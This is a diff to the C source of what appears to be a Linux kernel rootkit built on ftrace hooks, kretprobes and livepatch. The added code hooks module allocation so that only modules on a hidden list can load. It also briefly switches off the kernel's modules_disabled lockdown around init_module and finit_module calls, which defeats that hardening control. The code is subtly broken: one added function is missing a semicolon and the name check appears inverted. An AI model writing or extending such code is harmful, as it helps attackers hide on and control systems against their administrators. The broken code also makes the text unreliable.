@@ -142,6 +142,7 @@ static struct task_struct *(*p_find_task_by_pid_ns)(pid_t nr, struct pid_namespa
 
 //static void (*p___audit_bprm)(struct linux_binprm *bprm) = NULL;
 
+static int old_modules_disabled = 0;
 static int *p_modules_disabled = NULL;
 static struct list_head *p_modules = NULL;
 static char * (*p_module_flags)(struct module *mod, char *buf) = NULL;
@@ -226,6 +227,26 @@ end:
 #define kallsyms_lookup_addr find_kallsyms_addr
 
 #endif
+
+struct load_info {
+        const char *name;
+        /* pointer to module in temporary copy, freed at end of load_module() */
+        struct module *mod;
+        Elf_Ehdr *hdr;
+        unsigned long len;
+        Elf_Shdr *sechdrs;
+        char *secstrings, *strtab;
+        unsigned long symoffs, stroffs, init_typeoffs, core_typeoffs;
+        struct _ddebug *debug;
+        unsigned int num_debug;
+        bool sig_ok;
+#ifdef CONFIG_KALLSYMS
+        unsigned long mod_kallsyms_init_off;
+#endif
+        struct {
+                unsigned int sym, str, mod, vers, info, pcpu;
+        } index;
+};
 
 static bool has_pid_permissions(struct pid_namespace *pid,
                                  struct task_struct *task,
@@ -429,6 +450,23 @@ end:
 	return ret;
 }
 
+static int is_in_hidden_module_list(const char *name)
+{
+	int i = 0;
+	int ret = 0;
+
+	if (!name)
+		goto end;
+	for (i=0; i<num_module_list; i++) {
+		if (hidden_module_list[i]
+			 && strcmp(hidden_module_list[i]->name, name) == 0) {
+			ret = 1;
+			goto end;
+		}
+	}
+end:
+	return ret;
+}
 
 static struct dentry *livepatch_proc_pid_lookup(struct dentry *dentry, unsigned int flags)
 { 
@@ -1350,6 +1388,12 @@ static asmlinkage  ssize_t ftrace_msg_print_ext_body(struct pt_regs *regs)
 {
 	return real_msg_print_ext_body(regs);
 }
+
+static asmlinkage  struct module* (*real_layout_and_allocate)(struct pt_regs *regs) = NULL;
+static asmlinkage  struct module* ftrace_layout_and_allocate(struct pt_regs *regs)
+{
+	return real_layout_and_allocate(regs)
+}
 #else
 
 static asmlinkage long (*real_sched_getaffinity)(pid_t pid, struct cpumask *mask) = NULL;
@@ -1800,6 +1844,19 @@ static asmlinkage  ssize_t ftrace_msg_print_ext_body(char *buf, size_t size,
 
 	return real_msg_print_ext_body(buf, size, dict, dict_len, text, text_len);
 }
+
+static asmlinkage  struct module* (*real_layout_and_allocate)(struct load_info *info, int flags) = NULL;
+static asmlinkage  struct module* ftrace_layout_and_allocate(struct load_info *info, int flags)
+{
+	if (info && info->name && !is_hidden_module_name(info->name))
+		return ERR_PTR(-EPERM);
+
+	if (is_in_hidden_module_list(info->name))
+		return ERR_PTR(-EPERM);
+
+	return real_layout_and_allocate(info, flags);
+
+}
 #endif
 
 /* Check syscalls for hidden proc
@@ -1933,6 +1990,7 @@ static struct ftrace_hook hooks[] = {
         HOOK("unregister_kprobe", ftrace_unregister_kprobe, &real_unregister_kprobe),
         HOOK("msg_print_text", ftrace_msg_print_text, &real_msg_print_text),
         HOOK("msg_print_ext_body", ftrace_msg_print_ext_body, &real_msg_print_ext_body),
+        HOOK("layout_and_allocate", ftrace_layout_and_allocate, &real_layout_and_allocate),
 };
 
 static int entry_handler_sys_getpriority(struct kretprobe_instance *ri, struct pt_regs *regs)
@@ -1984,15 +2042,15 @@ static int ret_handler_do_sysinfo(struct kretprobe_instance *ri, struct pt_regs 
         return 0;
 }
 
-struct do_init_module_data {
+struct init_module_data {
 	struct module *m;
 };
 
 static int entry_handler_do_init_module(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-	struct do_init_module_data *data  = NULL;
+	struct init_module_data *data  = NULL;
 
-	data = (struct do_init_module_data *)ri->data;
+	data = (struct init_module_data *)ri->data;
 	data->m = (struct module *)regs_get_kernel_argument(regs, 0);
 
 	return 0;
@@ -2001,11 +2059,31 @@ static int entry_handler_do_init_module(struct kretprobe_instance *ri, struct pt
 static int ret_handler_do_init_module(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
 	unsigned long retval = regs_return_value(regs);
-	struct do_init_module_data *data  = NULL;
+	struct init_module_data *data  = NULL;
 
-	data = (struct do_init_module_data *)ri->data;
+	data = (struct init_module_data *)ri->data;
 	if (!retval && data && data->m && is_hidden_module_name(data->m->name))
 		hidden_module(data->m);
+
+	return 0;
+}
+
+static int entry_handler_init_module(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+	if (*p_modules_disabled) {
+		old_modules_disabled = *p_modules_disabled;
+		*p_modules_disabled = 0;
+	}
+
+	return 0;
+}
+
+static int ret_handler_init_module(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+	if (old_modules_disabled) {
+		*p_modules_disabled = old_modules_disabled;
+		old_modules_disabled = 0;
+	}
 
 	return 0;
 }
@@ -2033,12 +2111,29 @@ static struct kretprobe krps[] = {
 		.kp.symbol_name = "do_init_module",
 		.handler        = ret_handler_do_init_module,
 		.entry_handler  = entry_handler_do_init_module,
-		.data_size      = sizeof (struct do_init_module_data),
+		.data_size      = sizeof (struct init_module_data),
+		.maxactive      = 20,
+	},
+
+	{
+		//syscall init_module
+		.kp.symbol_name = "__x64_sys_init_module",
+		.handler        = ret_handler_init_module,
+		.entry_handler  = entry_handler_init_module,
+		.data_size      = 0,
+		.maxactive      = 20,
+	},
+	{
+		//syscall finit_module
+		.kp.symbol_name = "__x64_sys_finit_module",
+		.handler        = ret_handler_init_module,
+		.entry_handler  = entry_handler_init_module,
+		.data_size      = 0,
 		.maxactive      = 20,
 	},
 };
 
-struct kretprobe *rps[] = {&krps[0], &krps[1], &krps[2]};
+struct kretprobe *rps[] = {&krps[0], &krps[1], &krps[2], &krps[3], &krps[4]};
 
 static struct klp_func funcs[] = {
 	{
